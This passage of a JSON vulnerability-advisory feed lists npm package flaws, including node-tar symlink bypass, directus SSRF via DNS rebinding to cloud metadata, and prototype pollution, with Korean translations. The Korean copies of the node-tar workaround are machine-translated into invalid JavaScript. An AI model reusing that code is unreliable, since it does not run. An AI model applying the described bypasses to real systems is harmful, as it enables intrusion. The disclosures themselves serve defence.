    "descriptionKR": "### 영향\n\n임의 파일 생성, 임의 파일 덮어쓰기, 임의 코드 실행\n\n`node-tar`는 심볼릭 링크에 의해 위치가 수정되는 파일이 추출되지 않도록 보장하는 것을 목표로 합니다. 이것은 부분적으로 추출된 디렉토리가 심볼릭 링크가 아닌지 확인함으로써 달성됩니다. 또한 주어진 경로가 디렉토리인지 여부를 확인하기 위한 불필요한 `stat` 호출을 방지하기 위해 디렉토리가 생성될 때 경로가 캐시됩니다.\n\n이 논리는 디렉터리와 디렉터리와 이름이 같은 심볼릭 링크가 모두 포함된 tar 파일을 추출할 때 충분하지 않았습니다. 이 작업 순서로 인해 디렉토리가 생성되고 `node-tar` 디렉토리 캐시에 추가됩니다. 디렉터리 캐시에 디렉터리가 있으면 해당 디렉터리에 대한 mkdir에 대한 후속 호출을 건너뜁니다. 그러나 이것은 `node-tar`가 심볼릭 링크를 확인하는 곳이기도 합니다.\n\n먼저 디렉토리를 생성한 다음 해당 디렉토리를 심볼릭 링크로 대체함으로써 디렉토리에 대한 `node-tar` 심볼릭 링크 검사를 우회할 수 있었으며 기본적으로 신뢰할 수 없는 tar 파일이 임의의 위치로 심볼릭 링크되고 이후 임의의 파일을 해당 위치로 추출할 수 있었습니다. 따라서 임의의 파일 생성 및 덮어쓰기가 가능합니다.\n\n이 문제는 릴리스 3.2.3, 4.4.15, 5.0.7 및 6.1.2에서 해결되었습니다.\n\n### 패치\n\n3.2.3 || 4.4.15 || 5.0.7 || 6.1.2\n\n### 해결 방법\n\n사용자는 심볼릭 링크 추출을 방지하는 사용자 지정 '필터' 메서드를 생성하여 업그레이드하지 않고도 이 취약점을 해결할 수 있습니다.\n\n```js\nconst tar = 요구('타르')\n\ntar.x({\n  파일: 'archive.tgz',\n  필터: (파일, 항목) => {\n    if (entry.type === 'SymbolicLink') {\n      거짓 반환\n    } 또 다른 {\n      참을 반환\n    }\n  }\n})\n```\n\n사용자는 tar 입력 자체를 삭제하려고 시도하기보다는 최신 패치 버전으로 업그레이드하는 것이 좋습니다."
  },
  {
    "description": "### Impact\n\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\n`node-tar` aims to guarantee that any file whose location would be modified by a symbolic link is not extracted. This is, in part, achieved by ensuring that extracted directories are not symlinks.  Additionally, in order to prevent unnecessary `stat` calls to determine whether a given path is a directory, paths are cached when directories are created.\n\nThis logic was insufficient when extracting tar files that contained both a directory and a symlink with the same name as the directory. This order of operations resulted in the directory being created and added to the `node-tar` directory cache. When a directory is present in the directory cache, subsequent calls to mkdir for that directory are skipped. However, this is also where `node-tar` checks for symlinks occur.\n\nBy first creating a directory, and then replacing that directory with a symlink, it was thus possible to bypass `node-tar` symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thus allowing arbitrary file creation and overwrite.\n\nThis issue was addressed in releases 3.2.3, 4.4.15, 5.0.7 and 6.1.2.\n\n### Patches\n\n3.2.3 || 4.4.15 || 5.0.7 || 6.1.2\n\n### Workarounds\n\nUsers may work around this vulnerability without upgrading by creating a custom `filter` method which prevents the extraction of symbolic links.\n\n```js\nconst tar = require('tar')\n\ntar.x({\n  file: 'archive.tgz',\n  filter: (file, entry) => {\n    if (entry.type === 'SymbolicLink') {\n      return false\n    } else {\n      return true\n    }\n  }\n})\n```\n\nUsers are encouraged to upgrade to the latest patch versions, rather than attempt to sanitize tar input themselves.",
    "identifiers": "GHSA : GHSA-r628-mhmh-qjhw\nCVE : CVE-2021-32803",
    "severity": "HIGH",
    "updatedAt": "2023-03-09T16:44:58Z",
    "publishedAt": "2021-08-03T19:00:40Z",
    "references": "https://github.com/npm/node-tar/security/advisories/GHSA-r628-mhmh-qjhw\nhttps://github.com/npm/node-tar/commit/9dbdeb6df8e9dbd96fa9e84341b9d74734be6c20\nhttps://www.npmjs.com/advisories/1771\nhttps://nvd.nist.gov/vuln/detail/CVE-2021-32803\nhttps://www.npmjs.com/package/tar\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf\nhttps://github.com/isaacs/node-tar/commit/46fe35083e2676e31c4e0a81639dce6da7aaa356\nhttps://github.com/isaacs/node-tar/commit/5987d9a41f6bfbf1ddab1098e1fdcf1a5618f571\nhttps://github.com/isaacs/node-tar/commit/85d3a942b4064e4ff171f91696fced7975167349\nhttps://github.com/isaacs/node-tar/commit/9dbdeb6df8e9dbd96fa9e84341b9d74734be6c20\nhttps://github.com/advisories/GHSA-r628-mhmh-qjhw",
    "name": "tar",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.4.15",
    "identifier": "4.4.15",
    "descriptionKR": "### 영향\n\n임의 파일 생성, 임의 파일 덮어쓰기, 임의 코드 실행\n\n`node-tar`는 심볼릭 링크에 의해 위치가 수정되는 파일이 추출되지 않도록 보장하는 것을 목표로 합니다. 이것은 부분적으로 추출된 디렉토리가 심볼릭 링크가 아닌지 확인함으로써 달성됩니다. 또한 주어진 경로가 디렉토리인지 여부를 확인하기 위한 불필요한 `stat` 호출을 방지하기 위해 디렉토리가 생성될 때 경로가 캐시됩니다.\n\n이 논리는 디렉터리와 디렉터리와 이름이 같은 심볼릭 링크가 모두 포함된 tar 파일을 추출할 때 충분하지 않았습니다. 이 작업 순서로 인해 디렉토리가 생성되고 `node-tar` 디렉토리 캐시에 추가됩니다. 디렉터리 캐시에 디렉터리가 있으면 해당 디렉터리에 대한 mkdir에 대한 후속 호출을 건너뜁니다. 그러나 이것은 `node-tar`가 심볼릭 링크를 확인하는 곳이기도 합니다.\n\n먼저 디렉토리를 생성한 다음 해당 디렉토리를 심볼릭 링크로 대체함으로써 디렉토리에 대한 `node-tar` 심볼릭 링크 검사를 우회할 수 있었으며 기본적으로 신뢰할 수 없는 tar 파일이 임의의 위치로 심볼릭 링크되고 이후 임의의 파일을 해당 위치로 추출할 수 있었습니다. 따라서 임의의 파일 생성 및 덮어쓰기가 가능합니다.\n\n이 문제는 릴리스 3.2.3, 4.4.15, 5.0.7 및 6.1.2에서 해결되었습니다.\n\n### 패치\n\n3.2.3 || 4.4.15 || 5.0.7 || 6.1.2\n\n### 해결 방법\n\n사용자는 심볼릭 링크 추출을 방지하는 사용자 지정 '필터' 메서드를 생성하여 업그레이드하지 않고도 이 취약점을 해결할 수 있습니다.\n\n```js\nconst tar = 요구('타르')\n\ntar.x({\n  파일: 'archive.tgz',\n  필터: (파일, 항목) => {\n    if (entry.type === 'SymbolicLink') {\n      거짓 반환\n    } 또 다른 {\n      참을 반환\n    }\n  }\n})\n```\n\n사용자는 tar 입력 자체를 삭제하려고 시도하기보다는 최신 패치 버전으로 업그레이드하는 것이 좋습니다."
  },
  {
    "description": "### Impact\n\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\n`node-tar` aims to guarantee that any file whose location would be modified by a symbolic link is not extracted. This is, in part, achieved by ensuring that extracted directories are not symlinks.  Additionally, in order to prevent unnecessary `stat` calls to determine whether a given path is a directory, paths are cached when directories are created.\n\nThis logic was insufficient when extracting tar files that contained both a directory and a symlink with the same name as the directory. This order of operations resulted in the directory being created and added to the `node-tar` directory cache. When a directory is present in the directory cache, subsequent calls to mkdir for that directory are skipped. However, this is also where `node-tar` checks for symlinks occur.\n\nBy first creating a directory, and then replacing that directory with a symlink, it was thus possible to bypass `node-tar` symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thus allowing arbitrary file creation and overwrite.\n\nThis issue was addressed in releases 3.2.3, 4.4.15, 5.0.7 and 6.1.2.\n\n### Patches\n\n3.2.3 || 4.4.15 || 5.0.7 || 6.1.2\n\n### Workarounds\n\nUsers may work around this vulnerability without upgrading by creating a custom `filter` method which prevents the extraction of symbolic links.\n\n```js\nconst tar = require('tar')\n\ntar.x({\n  file: 'archive.tgz',\n  filter: (file, entry) => {\n    if (entry.type === 'SymbolicLink') {\n      return false\n    } else {\n      return true\n    }\n  }\n})\n```\n\nUsers are encouraged to upgrade to the latest patch versions, rather than attempt to sanitize tar input themselves.",
    "identifiers": "GHSA : GHSA-r628-mhmh-qjhw\nCVE : CVE-2021-32803",
    "severity": "HIGH",
    "updatedAt": "2023-03-09T16:44:58Z",
    "publishedAt": "2021-08-03T19:00:40Z",
    "references": "https://github.com/npm/node-tar/security/advisories/GHSA-r628-mhmh-qjhw\nhttps://github.com/npm/node-tar/commit/9dbdeb6df8e9dbd96fa9e84341b9d74734be6c20\nhttps://www.npmjs.com/advisories/1771\nhttps://nvd.nist.gov/vuln/detail/CVE-2021-32803\nhttps://www.npmjs.com/package/tar\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf\nhttps://github.com/isaacs/node-tar/commit/46fe35083e2676e31c4e0a81639dce6da7aaa356\nhttps://github.com/isaacs/node-tar/commit/5987d9a41f6bfbf1ddab1098e1fdcf1a5618f571\nhttps://github.com/isaacs/node-tar/commit/85d3a942b4064e4ff171f91696fced7975167349\nhttps://github.com/isaacs/node-tar/commit/9dbdeb6df8e9dbd96fa9e84341b9d74734be6c20\nhttps://github.com/advisories/GHSA-r628-mhmh-qjhw",
    "name": "tar",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.2.3",
    "identifier": "3.2.3",
    "descriptionKR": "### 영향\n\n임의 파일 생성, 임의 파일 덮어쓰기, 임의 코드 실행\n\n`node-tar`는 심볼릭 링크에 의해 위치가 수정되는 파일이 추출되지 않도록 보장하는 것을 목표로 합니다. 이것은 부분적으로 추출된 디렉토리가 심볼릭 링크가 아닌지 확인함으로써 달성됩니다. 또한 주어진 경로가 디렉토리인지 여부를 확인하기 위한 불필요한 `stat` 호출을 방지하기 위해 디렉토리가 생성될 때 경로가 캐시됩니다.\n\n이 논리는 디렉터리와 디렉터리와 이름이 같은 심볼릭 링크가 모두 포함된 tar 파일을 추출할 때 충분하지 않았습니다. 이 작업 순서로 인해 디렉토리가 생성되고 `node-tar` 디렉토리 캐시에 추가됩니다. 디렉터리 캐시에 디렉터리가 있으면 해당 디렉터리에 대한 mkdir에 대한 후속 호출을 건너뜁니다. 그러나 이것은 `node-tar`가 심볼릭 링크를 확인하는 곳이기도 합니다.\n\n먼저 디렉토리를 생성한 다음 해당 디렉토리를 심볼릭 링크로 대체함으로써 디렉토리에 대한 `node-tar` 심볼릭 링크 검사를 우회할 수 있었으며 기본적으로 신뢰할 수 없는 tar 파일이 임의의 위치로 심볼릭 링크되고 이후 임의의 파일을 해당 위치로 추출할 수 있었습니다. 따라서 임의의 파일 생성 및 덮어쓰기가 가능합니다.\n\n이 문제는 릴리스 3.2.3, 4.4.15, 5.0.7 및 6.1.2에서 해결되었습니다.\n\n### 패치\n\n3.2.3 || 4.4.15 || 5.0.7 || 6.1.2\n\n### 해결 방법\n\n사용자는 심볼릭 링크 추출을 방지하는 사용자 지정 '필터' 메서드를 생성하여 업그레이드하지 않고도 이 취약점을 해결할 수 있습니다.\n\n```js\nconst tar = 요구('타르')\n\ntar.x({\n  파일: 'archive.tgz',\n  필터: (파일, 항목) => {\n    if (entry.type === 'SymbolicLink') {\n      거짓 반환\n    } 또 다른 {\n      참을 반환\n    }\n  }\n})\n```\n\n사용자는 tar 입력 자체를 삭제하려고 시도하기보다는 최신 패치 버전으로 업그레이드하는 것이 좋습니다."
  },
  {
    "description": "In Development IL ecdh before 0.2.0, an attacker can send an invalid point (not on the curve) as the public key, and obtain the derived shared secret.",
    "identifiers": "GHSA : GHSA-p2hp-3wv3-4w74\nCVE : CVE-2022-44310",
    "severity": "HIGH",
    "updatedAt": "2023-03-08T17:22:31Z",
    "publishedAt": "2023-02-24T21:30:18Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-44310\nhttps://github.com/developmentil/ecdh/issues/3\nhttps://github.com/developmentil/ecdh/pull/4\nhttps://github.com/developmentil/ecdh/commit/ef4560e7233f4e8107a17a77bc540121599c78fa\nhttps://github.com/advisories/GHSA-p2hp-3wv3-4w74",
    "name": "ecdh",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.2.0",
    "identifier": "0.2.0",
    "descriptionKR": "개발 IL ecdh 0.2.0 이전에서는 공격자가 유효하지 않은 지점(곡선이 아님)을 공개 키로 보내고 파생된 공유 비밀을 얻을 수 있습니다."
  },
  {
    "description": "### Impact\n\nUsers with read access to the `password` field in `directus_users` can extract the argon2 password hashes by brute forcing the export functionality combined with a `_starts_with` filter. This allows the user to enumerate the password hashes.\n\n### Patches\n\nThe problem has been patched by preventing any hashed/concealed field to be filtered against with the `_starts_with` or other string operator.\n\n### Workarounds\n\nEnsuring that no user has `read` access to the `password` field in `directus_users` is sufficient to prevent this vulnerability. \n\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open a Discussion in [directus/directus](https://github.com/directus/directus/discussions/new)\n* Email us at [security@directus.io](mailto:security@directus.io)",
    "identifiers": "GHSA : GHSA-m5q3-8wgf-x8xf\nCVE : CVE-2023-27481",
    "severity": "MODERATE",
    "updatedAt": "2023-03-26T17:17:23Z",
    "publishedAt": "2023-03-08T17:13:05Z",
    "references": "https://github.com/directus/directus/security/advisories/GHSA-m5q3-8wgf-x8xf\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-27481\nhttps://github.com/directus/directus/pull/14829\nhttps://github.com/directus/directus/pull/15010\nhttps://github.com/advisories/GHSA-m5q3-8wgf-x8xf",
    "name": "directus",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 9.16.0",
    "identifier": "9.16.0",
    "descriptionKR": "### 영향\n\n`directus_users`의 `password` 필드에 대한 읽기 액세스 권한이 있는 사용자는 `_starts_with` 필터와 결합된 내보내기 기능을 무차별 대입하여 argon2 암호 해시를 추출할 수 있습니다. 이를 통해 사용자는 암호 해시를 열거할 수 있습니다.\n\n### 패치\n\n`_starts_with` 또는 기타 문자열 연산자를 사용하여 필터링되는 해시/숨김 필드를 방지하여 문제가 패치되었습니다.\n\n### 해결 방법\n\n어떤 사용자도 `directus_users`의 `password` 필드에 대한 `read` 액세스 권한이 없는지 확인하는 것만으로도 이 취약점을 방지할 수 있습니다.\n\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [directus/directus](https://github.com/directus/directus/discussions/new)에서 토론 열기\n* [security@directus.io](mailto:security@directus.io)로 이메일을 보내주세요."
  },
  {
    "description": "Versions of lodash prior to 4.17.19 are vulnerable to Prototype Pollution. The function zipObjectDeep allows a malicious user to modify the prototype of Object if the property identifiers are user-supplied. Being affected by this issue requires zipping objects based on user-provided property arrays.\n\nThis vulnerability causes the addition or modification of an existing property that will exist on all objects and may lead to Denial of Service or Code Execution under specific circumstances.",
    "identifiers": "GHSA : GHSA-p6mc-m468-83gw\nCVE : CVE-2020-8203",
    "severity": "HIGH",
    "updatedAt": "2023-03-08T05:05:35Z",
    "publishedAt": "2020-07-15T19:15:48Z",
    "references": "https://github.com/lodash/lodash/issues/4744\nhttps://github.com/lodash/lodash/commit/c84fe82760fb2d3e03a63379b297a1cc1a2fce12\nhttps://www.npmjs.com/advisories/1523\nhttps://nvd.nist.gov/vuln/detail/CVE-2020-8203\nhttps://hackerone.com/reports/712065\nhttps://security.netapp.com/advisory/ntap-20200724-0006/\nhttps://github.com/lodash/lodash/issues/4874\nhttps://www.oracle.com/security-alerts/cpuApr2021.html\nhttps://www.oracle.com//security-alerts/cpujul2021.html\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://www.oracle.com/security-alerts/cpujan2022.html\nhttps://www.oracle.com/security-alerts/cpuapr2022.html\nhttps://github.com/advisories/GHSA-p6mc-m468-83gw",
    "name": "lodash-es",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.17.20",
    "identifier": "4.17.20",
    "descriptionKR": "4.17.19 이전 버전의 lodash는 Prototype Pollution에 취약합니다. zipObjectDeep 함수를 사용하면 속성 식별자가 사용자 제공인 경우 악의적인 사용자가 Object의 프로토타입을 수정할 수 있습니다. 이 문제의 영향을 받으려면 사용자가 제공한 속성 배열을 기반으로 개체를 압축해야 합니다.\n\n이 취약점은 모든 개체에 존재할 기존 속성의 추가 또는 수정을 유발하고 특정 상황에서 서비스 거부 또는 코드 실행으로 이어질 수 있습니다."
  },
  {
    "description": "Versions of lodash prior to 4.17.19 are vulnerable to Prototype Pollution. The function zipObjectDeep allows a malicious user to modify the prototype of Object if the property identifiers are user-supplied. Being affected by this issue requires zipping objects based on user-provided property arrays.\n\nThis vulnerability causes the addition or modification of an existing property that will exist on all objects and may lead to Denial of Service or Code Execution under specific circumstances.",
    "identifiers": "GHSA : GHSA-p6mc-m468-83gw\nCVE : CVE-2020-8203",
    "severity": "HIGH",
    "updatedAt": "2023-03-08T05:05:35Z",
    "publishedAt": "2020-07-15T19:15:48Z",
    "references": "https://github.com/lodash/lodash/issues/4744\nhttps://github.com/lodash/lodash/commit/c84fe82760fb2d3e03a63379b297a1cc1a2fce12\nhttps://www.npmjs.com/advisories/1523\nhttps://nvd.nist.gov/vuln/detail/CVE-2020-8203\nhttps://hackerone.com/reports/712065\nhttps://security.netapp.com/advisory/ntap-20200724-0006/\nhttps://github.com/lodash/lodash/issues/4874\nhttps://www.oracle.com/security-alerts/cpuApr2021.html\nhttps://www.oracle.com//security-alerts/cpujul2021.html\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://www.oracle.com/security-alerts/cpujan2022.html\nhttps://www.oracle.com/security-alerts/cpuapr2022.html\nhttps://github.com/advisories/GHSA-p6mc-m468-83gw",
    "name": "lodash",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.17.20",
    "identifier": "4.17.20",
    "descriptionKR": "4.17.19 이전 버전의 lodash는 Prototype Pollution에 취약합니다. zipObjectDeep 함수를 사용하면 속성 식별자가 사용자 제공인 경우 악의적인 사용자가 Object의 프로토타입을 수정할 수 있습니다. 이 문제의 영향을 받으려면 사용자가 제공한 속성 배열을 기반으로 개체를 압축해야 합니다.\n\n이 취약점은 모든 개체에 존재할 기존 속성의 추가 또는 수정을 유발하고 특정 상황에서 서비스 거부 또는 코드 실행으로 이어질 수 있습니다."
  },
  {
    "description": "Versions of the package @nestjs/core before 9.0.5 are vulnerable to Information Exposure via the StreamableFile pipe. Exploiting this vulnerability is possible when the client cancels a request while it is streaming a StreamableFile, the stream wrapped by the StreamableFile will be kept open.",
    "identifiers": "GHSA : GHSA-4jpv-8r57-pv7j\nCVE : CVE-2023-26108",
    "severity": "MODERATE",
    "updatedAt": "2023-03-13T15:29:41Z",
    "publishedAt": "2023-03-06T06:30:18Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26108\nhttps://github.com/nestjs/nest/issues/9759\nhttps://github.com/nestjs/nest/pull/9819\nhttps://github.com/nestjs/nest/pull/9819/commits/f59cf5e81ca73bcdf1b5b36713550fd93918db41\nhttps://security.snyk.io/vuln/SNYK-JS-NESTJSCORE-2869127\nhttps://github.com/advisories/GHSA-4jpv-8r57-pv7j",
    "name": "@nestjs/core",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 9.0.5",
    "identifier": "9.0.5",
    "descriptionKR": "9.0.5 이전의 @nestjs/core 패키지 버전은 StreamableFile 파이프를 통한 정보 노출에 취약합니다. 클라이언트가 StreamableFile을 스트리밍하는 동안 요청을 취소하면 이 취약점을 악용할 수 있으며 StreamableFile로 래핑된 스트림은 열린 상태로 유지됩니다."
  },
  {
    "description": "### Impact\n\nInstances relying on an allow-listed reset URL are vulnerable to an HTML injection attack through the use of query parameters in the reset URL. \n\n### Patches\n\nThe problem has been resolved and released under version 9.23.0. People relying on a custom password reset URL should upgrade to 9.23.0 or later, or remove the custom reset url from the configured allow list.\n\n### Workarounds\n\nDisable the custom reset URL allow list.",
    "identifiers": "GHSA : GHSA-4hmq-ggrm-qfc6\nCVE : CVE-2023-27474",
    "severity": "HIGH",
    "updatedAt": "2023-03-07T20:35:54Z",
    "publishedAt": "2023-03-07T20:35:54Z",
    "references": "https://github.com/directus/directus/security/advisories/GHSA-4hmq-ggrm-qfc6\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-27474\nhttps://github.com/directus/directus/issues/17119\nhttps://github.com/directus/directus/pull/17120\nhttps://github.com/advisories/GHSA-4hmq-ggrm-qfc6",
    "name": "directus",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 9.23.0",
    "identifier": "9.23.0",
    "descriptionKR": "### 영향\n\n허용된 재설정 URL에 의존하는 인스턴스는 재설정 URL의 쿼리 매개변수 사용을 통한 HTML 주입 공격에 취약합니다.\n\n### 패치\n\n문제가 해결되어 버전 9.23.0에서 릴리스되었습니다. 사용자 지정 암호 재설정 URL을 사용하는 사용자는 9.23.0 이상으로 업그레이드하거나 구성된 허용 목록에서 사용자 지정 재설정 URL을 제거해야 합니다.\n\n### 해결 방법\n\n사용자 지정 재설정 URL 허용 목록을 비활성화합니다."
  },
  {
    "description": "All versions of the package dot-lens are vulnerable to Prototype Pollution via the `set()` function in `index.js` file.",
    "identifiers": "GHSA : GHSA-rmhg-2cvv-q7vx\nCVE : CVE-2023-26106",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T15:28:10Z",
    "publishedAt": "2023-03-06T06:30:18Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26106\nhttps://security.snyk.io/vuln/SNYK-JS-DOTLENS-3227646\nhttps://github.com/jb55/dot-lens/blob/465ef2088e4065b7be1c4372eedd2215c3820bc4/index.js#23L70\nhttps://github.com/advisories/GHSA-rmhg-2cvv-q7vx",
    "name": "dot-lens",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.2.3",
    "descriptionKR": "dot-lens 패키지의 모든 버전은 `index.js` 파일의 `set()` 함수를 통한 Prototype Pollution에 취약합니다."
  },
  {
    "description": "All versions of the package sketchsvg are vulnerable to Arbitrary Code Injection when invoking `shell.exec` without sanitization nor parametrization while concatenating the current directory as part of the command string.",
    "identifiers": "GHSA : GHSA-6722-xvq8-3254\nCVE : CVE-2023-26107",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T15:29:06Z",
    "publishedAt": "2023-03-06T06:30:18Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26107\nhttps://security.snyk.io/vuln/SNYK-JS-SKETCHSVG-3167969\nhttps://github.com/eBay/SketchSVG/blob/dd1036648f0f320a3187ef79d506b676b9eb87a6/lib/index.js#23L115\nhttps://github.com/eBay/SketchSVG/blob/dd1036648f0f320a3187ef79d506b676b9eb87a6/lib/index.js#23L64\nhttps://github.com/advisories/GHSA-6722-xvq8-3254",
    "name": "sketchsvg",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.0.1",
    "descriptionKR": "패키지 sketchsvg의 모든 버전은 현재 디렉터리를 명령 문자열의 일부로 연결하는 동안 삭제나 매개 변수화 없이 'shell.exec'를 호출할 때 임의 코드 주입에 취약합니다."
  },
  {
    "description": "node-static and the fork @nubosoftware/node-static are vulnerable to Directory Traversal due to improper file path sanitization in the startsWith() method in the servePath function.",
    "identifiers": "GHSA : GHSA-5g97-whc9-8g7j\nCVE : CVE-2023-26111",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T15:29:52Z",
    "publishedAt": "2023-03-06T06:30:18Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26111\nhttps://gist.github.com/lirantal/c80b28e7bee148dc287339cb483e42bc\nhttps://security.snyk.io/vuln/SNYK-JS-NODESTATIC-3149928\nhttps://security.snyk.io/vuln/SNYK-JS-NUBOSOFTWARENODESTATIC-3149927\nhttps://github.com/cloudhead/node-static/blob/master/lib/node-static.js#23L160-L163\nhttps://github.com/advisories/GHSA-5g97-whc9-8g7j",
    "name": "@nubosoftware/node-static",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.7.11",
    "descriptionKR": "node-static 및 포크 @nubosoftware/node-static은 servePath 함수의 startsWith() 메서드에서 부적절한 파일 경로 삭제로 인해 디렉터리 탐색에 취약합니다."
  },
  {
    "description": "node-static and the fork @nubosoftware/node-static are vulnerable to Directory Traversal due to improper file path sanitization in the startsWith() method in the servePath function.",
    "identifiers": "GHSA : GHSA-5g97-whc9-8g7j\nCVE : CVE-2023-26111",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T15:29:52Z",
    "publishedAt": "2023-03-06T06:30:18Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26111\nhttps://gist.github.com/lirantal/c80b28e7bee148dc287339cb483e42bc\nhttps://security.snyk.io/vuln/SNYK-JS-NODESTATIC-3149928\nhttps://security.snyk.io/vuln/SNYK-JS-NUBOSOFTWARENODESTATIC-3149927\nhttps://github.com/cloudhead/node-static/blob/master/lib/node-static.js#23L160-L163\nhttps://github.com/advisories/GHSA-5g97-whc9-8g7j",
    "name": "node-static",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.7.11",
    "descriptionKR": "node-static 및 포크 @nubosoftware/node-static은 servePath 함수의 startsWith() 메서드에서 부적절한 파일 경로 삭제로 인해 디렉터리 탐색에 취약합니다."
  },
  {
    "description": "A vulnerability, which was classified as critical, has been found in json-logic-js 2.0.0. Affected by this issue is some unknown functionality of the file logic.js. The manipulation leads to command injection. Upgrading to version 2.0.1 is able to address this issue. The name of the patch is c1dd82f5b15d8a553bb7a0cfa841ab8a11a9c227. It is recommended to upgrade the affected component. VDB-222266 is the identifier assigned to this vulnerability.",
    "identifiers": "GHSA : GHSA-67j4-2mh6-8627\nCVE : CVE-2021-4329",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-13T19:15:51Z",
    "publishedAt": "2023-03-05T21:30:15Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-4329\nhttps://github.com/jwadhams/json-logic-js/pull/98\nhttps://github.com/jwadhams/json-logic-js/commit/c1dd82f5b15d8a553bb7a0cfa841ab8a11a9c227\nhttps://vuldb.com/?ctiid.222266\nhttps://vuldb.com/?id.222266\nhttps://github.com/advisories/GHSA-67j4-2mh6-8627",
    "name": "json-logic-js",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.0.1",
    "identifier": "2.0.1",
    "descriptionKR": "위험으로 분류된 취약점이 json-logic-js 2.0.0에서 발견되었습니다. 이 문제의 영향을 받는 것은 logic.js 파일의 일부 알려지지 않은 기능입니다. 조작은 명령 주입으로 이어집니다. 버전 2.0.1로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치의 이름은 c1dd82f5b15d8a553bb7a0cfa841ab8a11a9c227입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. VDB-222266은 이 취약점에 할당된 식별자입니다."
  },
  {
    "description": "A remote code execution vulnerability exists in Xterm.js when the component mishandles special characters.",
    "identifiers": "GHSA : GHSA-mc23-976p-j42x\nCVE : CVE-2019-0542",
    "severity": "HIGH",
    "updatedAt": "2023-03-07T00:43:49Z",
    "publishedAt": "2019-01-14T16:19:55Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-0542\nhttps://github.com/advisories/GHSA-mc23-976p-j42x\nhttps://access.redhat.com/errata/RHBA-2019:0959\nhttps://access.redhat.com/errata/RHSA-2019:1422\nhttps://access.redhat.com/errata/RHSA-2019:2551\nhttps://access.redhat.com/errata/RHSA-2019:2552\nhttp://www.securityfocus.com/bid/106434\nhttps://github.com/xtermjs/xterm.js/commit/3592c641cd0348e0b698e8a180aea2072c6bcd9a\nhttps://github.com/xtermjs/xterm.js/releases/tag/3.8.1",
    "name": "xterm",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.10.0, < 3.10.1",
    "identifier": "3.10.1",
    "descriptionKR": "구성 요소가 특수 문자를 잘못 처리하는 경우 Xterm.js에 원격 코드 실행 취약성이 존재합니다."
  },
  {
    "description": "All versions of the package utilities are vulnerable to Prototype Pollution via the _mix function.",
    "identifiers": "GHSA : GHSA-wxfj-84xf-7gxv\nCVE : CVE-2023-26105",
    "severity": "HIGH",
    "updatedAt": "2023-03-08T23:14:00Z",
    "publishedAt": "2023-02-28T06:30:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26105\nhttps://github.com/mde/utilities/issues/29\nhttps://security.snyk.io/vuln/SNYK-JS-UTILITIES-3184491\nhttps://github.com/advisories/GHSA-wxfj-84xf-7gxv",
    "name": "utilities",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.0.6",
    "descriptionKR": "패키지 유틸리티의 모든 버전은 _mix 기능을 통한 Prototype Pollution에 취약합니다."
  },
  {
    "description": "### Summary\nDirectus versions <=9.22.4 is vulnerable to Server-Side Request Forgery (SSRF) when importing a file from a remote web server (POST to `/files/import`). An attacker can bypass the security controls that were implemented to patch vulnerability [CVE-2022-23080](https://security.snyk.io/vuln/SNYK-JS-DIRECTUS-2934713) by performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding) and view sensitive data from internal servers or perform a local port scan (eg. can access internal metadata API for AWS at `http://169.254.169.254` event if `169.254.169.254` is in the deny IP list).\n\n### Details\nDNS rebinding attacks work by running a DNS name server that resolves two different IP addresses when a domain is resolved simultaneously. This type of attack can be exploited to bypass the IP address deny list validation that was added to [`/api/src/services/file.ts`](https://github.com/directus/directus/blob/main/api/src/services/files.ts) for the function `importOne` to mitigate the previous SSRF vulnerability [CVE-2022-23080](https://security.snyk.io/vuln/SNYK-JS-DIRECTUS-2934713). The validation in [`/api/src/services/file.ts`](https://github.com/directus/directus/blob/main/api/src/services/files.ts) first checks if the resolved IP address for a domain name does not a resolve to an IP address in the deny list:\n\n```js\nlet ip = 